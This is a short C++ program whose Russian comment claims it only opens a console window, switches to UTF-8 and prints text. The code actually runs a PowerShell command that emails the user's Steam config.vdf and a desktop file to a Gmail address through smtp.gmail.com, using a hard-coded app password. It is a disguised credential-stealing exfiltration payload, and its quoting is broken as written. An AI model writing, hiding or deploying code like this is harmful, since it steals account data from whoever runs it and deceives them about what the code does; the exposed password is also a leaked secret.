#include <cstdlib>

int main()
{
    // Открываем новое окно CMD, которое остаётся открытым (/K),
    // переключаем кодовую страницу на UTF-8 (chcp 65001),
    // чтобы кириллица отображалась правильно, и выводим текст.
    std::system("start powershell /K \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $From = "helloveritt@gmail.com"; $To = "helloveritt@gmail.com"; $Subject = "Test message subject from $($env:computername)"; $Body = "Email text"; $Files = @("C:\Program Files (x86)\Steam\config\config.vdf ", "C:\Users\Danil\Desktop\cmd.txt"); $AppPassword = "ezotgjkrgglqghol" | ConvertTo-SecureString -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($From, $AppPassword); Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments $Files -Encoding UTF8 -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential $Credential"");
    return 0;
}
